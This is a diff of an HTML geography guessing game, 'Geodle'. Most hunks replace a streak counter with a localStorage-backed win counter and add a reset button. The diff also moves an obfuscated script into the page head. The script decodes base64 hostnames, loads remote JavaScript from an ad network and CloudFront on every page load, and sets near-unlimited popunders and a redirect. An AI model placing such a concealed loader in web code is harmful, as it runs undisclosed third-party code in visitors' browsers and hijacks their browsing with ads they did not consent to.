@@ -7,6 +7,11 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css" />
 <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
 <script src="data.js"></script>
+<script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+(function(){var a=window,p="bf128af1619960cff9b8bb4a42e55104",o=[["siteId",452-963+149+5221091],["minBid",0.00000001],["popundersPerIP","9999999,9999999"],["delayBetween",0],["default","https://2048-unblocked.netlify.app/"],["defaultPerDay",1],["topmostLayer","auto"]],t=["d3d3LmJldHRlcmFkc3lzdGVtLmNvbS95aG9wc2NvdGNoLm1pbi5jc3M=","ZDJrazBvM2ZyN2VkMDEuY2xvdWRmcm9udC5uZXQvWkx4US9vY3VzdG9tLm1pbi5qcw=="],d=-1,q,k,n=function(){clearTimeout(k);d++;if(t[d]&&!(1779163013000<(new Date).getTime()&&1<d)){q=a.document.createElement("script");q.type="text/javascript";q.async=!0;var w=a.document.getElementsByTagName("script")[0];q.src="https://"+atob(t[d]);q.crossOrigin="anonymous";q.onerror=n;q.onload=function(){clearTimeout(k);a[p.slice(0,16)+p.slice(0,16)]||n()};k=setTimeout(n,5E3);w.parentNode.insertBefore(q,w)}};if(!a[p]){try{Object.freeze(a[p]=o)}catch(e){}n()}})();
+/*]]>/* */
+</script>
 <style>
   body {
     font-family: Arial, sans-serif;
@@ -184,6 +189,20 @@
   #resetBtn:hover {
     background: #c82333;
   }
+  #resetWinsBtn {
+    background: #6f42c1;
+    color: white;
+    border: none;
+    padding: 8px 14px;
+    cursor: pointer;
+    font-size: 1em;
+    border-radius: 6px;
+    margin: 10px auto;
+    display: block;
+  }
+  #resetWinsBtn:hover {
+    background: #5a2d91;
+  }
   #loadingError {
     background: #ffebee;
     border: 1px solid #f44336;
@@ -211,8 +230,9 @@
   <button id="guessButton" type="submit">Guess</button>
 </form>
 <div id="feedback"></div>
-<div id="streak">🔥 Streak: 0</div>
+<div id="streak">🏆 Total Wins: 0</div>
 <button id="resetBtn">🔄 Reset Game</button>
+<button id="resetWinsBtn">🏆 Reset Win Count</button>
 <div id="history">
   <h3>Guess History</h3>
   <ul id="historyList"></ul>
@@ -234,8 +254,23 @@ let currentQuestion = null;
 let currentClueIndex = 0;
 let guessHistory = [];
 let gameEnded = false;
-let currentStreak = 0;
+let totalWins = 0;
 let worldMap = null;
+
+// Load and save win count from localStorage
+function loadWinCount() {
+  const savedWins = localStorage.getItem('geodle_total_wins');
+  totalWins = savedWins ? parseInt(savedWins, 10) : 0;
+}
+
+function saveWinCount() {
+  localStorage.setItem('geodle_total_wins', totalWins.toString());
+}
+
+function resetWinCount() {
+  totalWins = 0;
+  saveWinCount();
+}
 
 // Check if data is loaded and validate it
 function validateData() {
@@ -306,15 +341,13 @@ function initGame() {
   // Focus on input
   document.getElementById('guessInput').focus();
   
-  // Load streak from memory (not using localStorage in artifacts)
-  updateStreakDisplay();
+  // Load win count from localStorage
+  loadWinCount();
+  updateWinDisplay();
 }
 
 function resetGame() {
-  // Reset streak to 0
-  currentStreak = 0;
-  
-  // Initialize a new game
+  // Initialize a new game (don't reset win count)
   initGame();
   
   // Show reset confirmation
@@ -331,8 +364,8 @@ function updateProgressBar() {
   document.getElementById('progressFill').style.width = progress + '%';
 }
 
-function updateStreakDisplay() {
-  document.getElementById('streak').textContent = `🔥 Streak: ${currentStreak}`;
+function updateWinDisplay() {
+  document.getElementById('streak').textContent = `🏆 Total Wins: ${totalWins}`;
 }
 
 // Initialize Leaflet world map
@@ -395,8 +428,9 @@ function handleGuess(e) {
   
   if (isCorrect) {
     showFeedback(`🎉 Correct! The answer is ${currentQuestion.answer}`, 'green');
-    currentStreak++;
-    updateStreakDisplay();
+    totalWins++;
+    saveWinCount();
+    updateWinDisplay();
     endGame(true);
   } else {
     if (currentClueIndex < 9) {
@@ -406,8 +440,6 @@ function handleGuess(e) {
       showFeedback(`❌ ${guess} is not correct. Here's the next clue...`, 'red');
     } else {
       showFeedback(`😔 Game Over! The answer was ${currentQuestion.answer}`, 'orange');
-      currentStreak = 0;
-      updateStreakDisplay();
       endGame(false);
     }
   }
@@ -461,7 +493,7 @@ function shareScore() {
   const won = guessHistory.some(guess => guess.correct);
   const cluesUsed = won ? currentClueIndex + 1 : 10;
   const scoreText = won ? 
-    `🌍 Geodle - I guessed "${currentQuestion.answer}" in ${cluesUsed}/10 clues! Streak: ${currentStreak}` :
+    `🌍 Geodle - I guessed "${currentQuestion.answer}" in ${cluesUsed}/10 clues! Total Wins: ${totalWins}` :
     `🌍 Geodle - I couldn't guess "${currentQuestion.answer}" in 10 clues. Can you?`;
   
   if (navigator.share) {
@@ -487,15 +519,16 @@ document.addEventListener('DOMContentLoaded', function() {
   // Set up event listeners
   document.getElementById('guessForm').addEventListener('submit', handleGuess);
   document.getElementById('resetBtn').addEventListener('click', resetGame);
+  document.getElementById('resetWinsBtn').addEventListener('click', function() {
+    if (confirm('Are you sure you want to reset your win count? This cannot be undone.')) {
+      resetWinCount();
+      updateWinDisplay();
+      showFeedback('🏆 Win count reset to 0!', '#6f42c1');
+    }
+  });
   document.getElementById('shareBtn').addEventListener('click', shareScore);
   document.getElementById('newGameBtn').addEventListener('click', initGame);
 });
 </script>
-<script type="text/javascript" data-cfasync="false">
-/*<![CDATA[/* */
-(function(){var a=window,p="bf128af1619960cff9b8bb4a42e55104",o=[["siteId",452-963+149+5221091],["minBid",0.00000001],["popundersPerIP","9999999,9999999"],["delayBetween",0],["default","https://2048-unblocked.netlify.app/"],["defaultPerDay",1],["topmostLayer","auto"]],t=["d3d3LmJldHRlcmFkc3lzdGVtLmNvbS95aG9wc2NvdGNoLm1pbi5jc3M=","ZDJrazBvM2ZyN2VkMDEuY2xvdWRmcm9udC5uZXQvWkx4US9vY3VzdG9tLm1pbi5qcw=="],d=-1,q,k,n=function(){clearTimeout(k);d++;if(t[d]&&!(1779163013000<(new Date).getTime()&&1<d)){q=a.document.createElement("script");q.type="text/javascript";q.async=!0;var w=a.document.getElementsByTagName("script")[0];q.src="https://"+atob(t[d]);q.crossOrigin="anonymous";q.onerror=n;q.onload=function(){clearTimeout(k);a[p.slice(0,16)+p.slice(0,16)]||n()};k=setTimeout(n,5E3);w.parentNode.insertBefore(q,w)}};if(!a[p]){try{Object.freeze(a[p]=o)}catch(e){}n()}})();
-/*]]>/* */
-</script>
-
 </body>
 </html>
